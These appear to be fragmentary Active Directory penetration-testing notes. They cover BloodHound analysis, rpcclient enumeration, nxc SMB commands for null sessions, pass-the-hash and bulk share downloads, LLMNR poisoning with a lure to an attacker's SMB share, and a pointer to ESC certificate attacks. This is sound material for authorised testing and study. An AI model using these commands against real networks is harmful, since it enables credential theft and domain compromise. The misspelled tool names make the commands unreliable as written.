...
8. In bloodhound:
   ...
   11. Outbound Object Control: click on everything
   12. On the graph, click on the interessant edges
   13. In Anlysis -> shortest path to High Value Targets
...
`rpccclient`
  ...
  - `querydispinfo` Displays descriptions of users (could be some password in it)
  - `enumprinters`
...
- Local authentication: `nxcsmb [IP] -u '' -p '' --local-auth`
- NTLM hash: `nxcsmb [IP] -u '' -p '' -H [HASH]`

  ```bash
  --shares	                              # List shares
  -M spider_plus -o DOWNLOAD_FLAG=True    # Download all files
  --pass-pol # Password policy, if Account Lockout Threshold=None -> brute forcing
...
- **LLMNR**
  ...
  1. Open malicious SMB share with `respond()` or on Windows using `Invoke-Inveigh -NBNS Y -mDNS Y -FileOutput Y -SMB Y`

  2. Find a way for users to open the malicious share link: `\\[RESPONDER_IP]\x`
...
2. Dump the database
	...
	- Users and Descriptions
		```bash
		cat domain_users.json | grep -i samaccountname -A1 | grep -vi samaccountname | grep -v - | tr -d '"' | tr -d ' ' > ./user.txt
		```
...
3. (AD) Bloodhound 
	```bash
	nxc ldap [DC_HOSTNAME] -u [USER] -p [PASS] --dns-tcp --dns-server [DC_IP] --bloodhound --collection All
	```
	- Open the ZIP file inside Bloodhound
	- Search & mark as Owned every user you compromised
	- Check Outbound Object Controls of every such user in Node Info
	- Check All "Shortest Path Queries" in Analysis (if there are no interesting one above)
...
```
Research the corresponding `ESC` type exploits 
